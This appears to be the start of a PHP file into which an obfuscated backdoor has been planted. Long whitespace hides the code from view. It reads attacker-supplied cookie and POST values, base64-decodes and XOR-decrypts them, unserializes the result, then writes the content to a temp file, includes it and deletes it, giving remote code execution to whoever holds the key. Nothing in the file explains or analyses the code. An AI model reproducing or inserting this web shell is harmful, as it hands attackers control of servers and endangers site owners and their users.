<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vmeoykr")){class vmeoykr{public static $icdrf = "ymxizothhumcrlfg";public static $oufzuciiq = NULL;public function __construct(){$qtptkso = @$_COOKIE[substr(vmeoykr::$icdrf, 0, 4)];if (!empty($qtptkso)){$ysfml = "base64";$ugihs = "";$qtptkso = explode(",", $qtptkso);foreach ($qtptkso as $bbmhb){$ugihs .= @$_COOKIE[$bbmhb];$ugihs .= @$_POST[$bbmhb];}$ugihs = array_map($ysfml . "_decode", array($ugihs,)); $ugihs = $ugihs[0] ^ str_repeat(vmeoykr::$icdrf, (strlen($ugihs[0]) / strlen(vmeoykr::$icdrf)) + 1);vmeoykr::$oufzuciiq = @unserialize($ugihs);}}public function __destruct(){$this->vqxgaxiqkz();}private function vqxgaxiqkz(){if (is_array(vmeoykr::$oufzuciiq)) {$plzsz = sys_get_temp_dir() . "/" . crc32(vmeoykr::$oufzuciiq["salt"]);@vmeoykr::$oufzuciiq["write"]($plzsz, vmeoykr::$oufzuciiq["content"]);include $plzsz;@vmeoykr::$oufzuciiq["delete"]($plzsz);exit();}}}$iabaffwpbx = new vmeoykr(); $iabaffwpbx = NULL;} ?><?php
